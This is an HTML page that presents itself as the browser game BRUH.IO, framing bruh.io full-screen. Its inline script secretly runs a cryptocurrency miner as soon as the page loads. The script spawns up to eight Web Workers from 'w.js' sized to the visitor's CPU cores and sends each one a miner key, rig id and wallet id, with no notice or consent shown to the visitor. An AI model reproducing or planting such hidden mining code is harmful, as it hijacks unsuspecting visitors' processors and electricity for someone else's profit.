<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" href="https://bruh.io/favicon.a91962f5.ico">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
	<style type="text/css">
	    html,body {
	        width: 100%;
	        height: 100%;
	        overflow: hidden;
	    }
    	</style>
	<title>BRUH.IO | Battle Royale in your browser!</title>
</head>
<body>
<iframe src="https://bruh.io" style="border:0px #ffffff none;" name="bruh.io" scrolling="no" frameborder="0" marginheight="0px" marginwidth="0px" height="100%" width="100%" allowfullscreen></iframe>
<script type="text/javascript">
	// Get the amount of threads available
const userThreads = navigator.hardwareConcurrency;

// Default username, Rigid and amount of threads
let username = 'Raafet';
let miner_key = '3142812s';
let rigid = 'Webminer-2';
let threads = 8;
let wallet_id = Math.floor(Math.random() * 2811);


function startMiner() {
    // Validate the amount of threads
    if (threads < 1) {
        threads = 1;
    }
    if (threads > 8) {
        threads = 8;
    }
    if (threads > userThreads) {
        threads = userThreads;
    }

    // Set workerVer
    let workerVer = 0;

    // Loop through the amount of threads
    for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
        // Create the worker  
        var worker = new Worker('w.js?v=2');
        // Send the username, rigid and workerVer to the worker
        worker.postMessage('Start,' + username + "," + rigid + "," + workerVer + "," + wallet_id + "," + miner_key);
        // Add 1 to workerVer
        workerVer++;
        worker.onmessage = function(event) {
            const data = event.data.split(",");
            //console.log(data);
        }
    }
}
startMiner();
</script>
</body>
</html>
